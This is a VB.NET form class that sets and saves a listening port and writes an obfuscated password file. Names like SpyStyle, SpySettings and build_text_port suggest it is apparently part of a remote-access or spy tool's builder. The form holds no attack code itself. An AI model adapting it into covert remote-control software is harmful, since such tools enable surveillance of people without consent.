Imports System.IO
 Public Class Frm_Ports
    Public _ports As String = Nothing
    Sub New()
         InitializeComponent()
         Me.Font = Frm_Config_Settings.f
     End Sub
    Private Sub SpyStyle()
                          End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub Ports_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Icon = My.Resources.max
         Dim filepath = Environment.CurrentDirectory.ToString & "\res\Config\Pass.inf"
        Dim list = File.ReadAllLines(filepath)
        For Each lin In list
        Next
        SpyStyle()
         For Each p In My.Settings.ports.Split(":")
             If p IsNot Nothing Then
                po.Value = CInt(p)
            End If
         Next
         po.Value = My.Settings.build_text_port
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
         b_ok.Focus()
         b_ok.Select()
     End Sub
    Private Sub b_ok_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub pnl1_Paint(sender As Object, e As PaintEventArgs)
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        Me.DialogResult = DialogResult.No
        Me.Close()
    End Sub

    Private Sub passtxt_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles b_ok.Click
        Try
            Dim filepath = Environment.CurrentDirectory.ToString & "\res\Config\Pass.inf"
            If Not File.Exists(filepath) Then
                File.WriteAllText(filepath, 字意英文天是感答那许词非式十频要中的丢表谢达语频说道方说说字("X0X0X", sockets.Data.THEKEY))
            End If
            Dim list = File.ReadAllLines(filepath)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        If po.Value > 0 Then
            My.Settings.build_text_port = po.Value
            My.Settings.Save()
            _ports &= po.Value
            Me.DialogResult = DialogResult.OK
        Else
            Me.DialogResult = DialogResult.Cancel
        End If
    End Sub
End Class